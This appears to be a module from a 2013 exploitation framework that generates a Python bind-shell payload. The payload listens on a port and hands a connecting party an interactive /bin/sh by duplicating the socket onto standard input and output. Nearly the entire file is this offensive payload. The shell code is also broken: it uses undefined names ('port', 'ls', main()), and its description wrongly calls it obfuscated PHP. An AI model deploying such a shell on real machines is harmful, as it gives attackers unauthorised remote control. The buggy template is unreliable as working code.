'''
Created on Feb 12, 2013

@author: infodox
'''

# must include this
from core.core import payload

class payload(payload):
    """
    The generic payload template
    """
    
    def set_title(self):
        self.title = "Generic python bind shell payload"
          
    def set_description(self):
        self.description = \
        """
        This payload executes a bind shell on the affected target using obfuscated php."""    
        
    def get_payload_type(self):
        return "bind"
    
    def set_author(self):
        self.author = \
        [
            ['infodox','<darren[at]insecurety.net>'],    # zro module
        ]
        
    # needs fixing
    def register_options(self):
        self.opt_params["rport"] = \
        [
            4444, "The remote host's port to listen on" 
        ]
        
    def initialise_payload(self):
        
        rport = int(self.opt_params["rport"][0])
        
        self.shell = \
        """
import socket
import sys
import os

PORT = %s           # The same port as used by the server



s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);

try:
	s.bind(('', port))
	s.listen(1)
	(conn, addr) = ls.accept()
	cli= conn.fileno()
	os.dup2(cli, 0)
	os.dup2(cli, 1)
	os.dup2(cli, 2)
	arg0='/bin/sh'
	arg1='-a'
	args=[arg0]+[arg1]
	os.execv(arg0, args)
except(socket.error):
	conn.close()
	sys.exit(1)

if __name__ == "__main__":
    sys.exit(main())
        """ % (rport)
        
        return self.shell
